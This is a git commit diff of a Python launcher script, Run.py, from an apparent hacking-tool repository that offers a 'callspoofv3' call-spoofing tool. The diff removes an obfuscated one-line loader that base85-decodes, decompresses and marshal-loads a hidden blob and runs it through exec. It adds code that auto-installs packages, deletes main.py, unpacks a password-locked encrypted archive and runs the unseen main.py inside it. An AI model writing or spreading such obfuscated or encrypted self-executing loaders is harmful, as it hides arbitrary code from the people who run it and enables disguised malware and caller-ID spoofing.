fc520fef850eaec114542d6bedddc85a68013f5d
Zork Ethical Hacker <98804125+samay825@users.noreply.github.com>
2024-04-05 08:05:51 +0530

    Update Run.py

--- Run.py
+++ Run.py
@@ -1,4 +1,100 @@
+# Scripted by Samay
+# Whatsapp Lock
+# Simple as Fu#ck
+
+# ---------------- Imports
+import os
+import shutil
+
+try:
+    import pyzipper
+    import colorama
+except ImportError:
+    _ = os.system('pip install colorama' if os.name == 'nt' else 'pip3 install colorama')
+    _ = os.system('pip install pyzipper' if os.name == 'nt' else 'pip3 install pyzipper')
+    _ = os.system('pip install requests' if os.name == 'nt' else 'pip3 install requests')
+import pyzipper
+import sys
+from time import sleep
+from getpass import getpass
+from colorama import Fore
+
+# -------------------Colors
+r = "\033[1;31m"
+g = "\033[1;32m"
+y = "\033[1;33m"
+b = "\033[1;34m"
+d = "\033[2;37m"
+R = "\033[1;41m"
+Y = "\033[1;43m"
+B = "\033[1;44m"
+w = "\033[1;37m"
+g = "\033[0;90m"
+y = r
+
+# ------------------banners
+logo = Fore.RED + """
+  ___________________________________ _____________ 
+ /   _____/\_   _____/\__    ___/    |   \______   |
+ \_____  \  |    __)_   |    |  |    |   /|     ___/
+ /        \ |        \  |    |  |    |  / |    |    
+/_______  //_______  /  |____|  |______/  |____|    
+        \/         \/                              
+            """ + Fore.YELLOW + """>>> """ + Fore.GREEN + """TEAM-SINCRYPTION""" + Fore.YELLOW + """ <<< 
+
+"""
 
 
+def banner():
+    print(logo)
 
-_1nf3r10r_ = lambda __1nf3r10r__ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b85decode(__1nf3r10r__[::-1])));eval("exec((_1nf3r10r_)(b'mlM9DiAyY1rv@)z7a>S=3QJJZly^+vP^@n|;$|psU4MD9n5-VDHn3364WPQ)Dl4sNgAF>lH$(5Q)TSH_=7D3N~wIB$av?SDrcKaeick-Gx0ETuq1*J=%w~tYv=pL!ORMv+|?I)!lq#)q(|n!PrvIBoxp{S~~t)3jEzph2p6@e&|Nvl`rl95XO@KbIYLtJ%sxbD)KlL<oT*+Rh`es==me}>=V5a=2Y8$7DXN54jP{#U8XSv0A59I8X`ZF;>?~{?;pKnlXUnHAh9%Up=XBnrL!V+&@|S(BEjNGJVLYmY(CbsjZ+w(6aeBHloo&3Qfle-_2DIT0Ub!$ni#3{{}rkPNfxfkUMxfD{}bzt3G@yhPjUaO>?6uGCsYzkuA_hcmp&G4?jm_m&>dQLr>GnV^iK_+G%MlOmCt{b?jZ`!Y7u@~dvb__VAAvcd|@Qihfn%2Xs9|FCu3MmrFyS2U3(3`yu%cy@+p#XDK3?!ihMw1D#oyW*iY^2UqqV`-Em+n?I6R_BK1>*F!KUFInJU2J@0QNa05R&>T(iy+f`tE&uM3+8wYvcv@T?B0+mJoF-)`nAx~@~zH*N91RX#4NEIG}z-)}J8+)#DK_WiB``|%~M5C8<VxgdlzqB<a-Nn?ZWr}1tl$i9>RWS7fJcdJ5Ya`ON>{cV*8Snn;&&yPOuI${oDwCJXvFEd#D5GSVa-^i(<9>OZTL`E0aMXtek$fgT0+j$D6WBYyMWG4m)A1#5#+NH~!C~HSGj-V3<?@J7|2t1pIRRiu{et<RKQ(I;hpbiJo7eP)3E{lS$CBaGr8Ufg&7BGtG_@PcksVCWV!>Tt{T)_MD0Y=qB?}3u3DjbFWtg(GZk_k!tp<G0csvWpt+~OIM-%TU#cEV7Qc|ovo%|sga!HHJ$P-wmPhuC$v5cP05><qA1o7WPoY;E;TvE6}oaf{Ej6Ylu@NuT-)(6L@Mt0kSFTqJjcT5jY5Z5=OwC5{d?e?~t8F#E{l%b~(`pYSYYh_IMu2Y;ozL0_bdZn2q)f-FXRxl>jezdmmF<Lz>%H_{bEtvL@4&Ff1ZO3mU4m{+D{6cw?gy@#vd?JT80Fo+C+QHc3z<)c`CKl_I!WCfcJC5SJc-M0u4UjQaP0L?yF!yz8<|t9n-#;kGCo#OLKtIz?A!l~y_uYz^0-QAtg2s~(SE{ISxOG8B{tM+9;Ci6s!-uY#!uR^#<4<7~Lu7wQ^EOk+gjgomnnOw-Ogb`yLg|D*g~&vADM-xkBKlA<q4>93<J4)$kcFAcma=fKyh$5+5$c0jg~}tULxmDvFHH6UWu`-?(FJ{oB|-D?jmK)7qOc<bpj!}NoO3rdN{Y6G7by&jrxhg-%xH4)<yG+G5voyDlSD1Q3R#O4Mv=4X314YN=92w0rv@i>Db7x$FP)P|J9m{<fi~_d6}QlK1-jhbFTk?&=UdIAI|7dYhX9#EeBvlenfQvpaBDoy1fW!0c6{HeyU*dUR;DvGbb=@AOEvw?Cd-6MMv);W3XX@RSAqQ6VT&b0kh;Q&^8}lW5Ia8Z{9S}$c'))")
+def cls_clear_func():
+    os.system('cls' if os.name=='nt' else 'clear')
+
+def exixting_directory_file(file):
+    if os.path.exists(file):
+        os.remove(file)
+
+def designprint(samaywrite):
+    print(r+"└─> "+w+"\033[1;37m"+samaywrite)
+
+def front_design():
+    cls_clear_func()
+    banner()
+
+front_design()
+
+
+class Setup:
+    def __init__(self,user):
+        self.data = user
+    def mainFile(self):
+        self.save = self.data
+        try:
+            with pyzipper.AESZipFile('Zork/callspoofv3.zip', 'r', compression=pyzipper.ZIP_DEFLATED,
+                                     encryption=pyzipper.WZ_AES) as extracted_zip:
+                extracted_zip.extractall(pwd=str.encode(self.save))
+            designprint('Password Correct !')
+            sleep(2.3)
+            front_design()
+            designprint('Successfully Decrypted and unzipped file with password..')
+            sleep(3.0)
+            exixting_directory_file('callspoofv3.zip')
+            cls_clear_func()
+            banner()
+            os.system('python main.py' if os.name=='nt' else 'python3 main.py')
+        except Exception as samay:
+            designprint('Password Incorrect !')
+            sleep(0.5)
+            os.system('python Run.py' if os.name=='nt' else 'python3 Run.py')
+
+
+try:
+    user_ezip_unzipping = getpass(r+"└─"+w+"\033[1;37mEnter the password of Zipfile : "+r).strip()
+except:
+    pass
+
+if __name__ == '__main__':
+    exixting_directory_file('main.py')
+    main_start = Setup(user_ezip_unzipping)
+    main_start.mainFile()
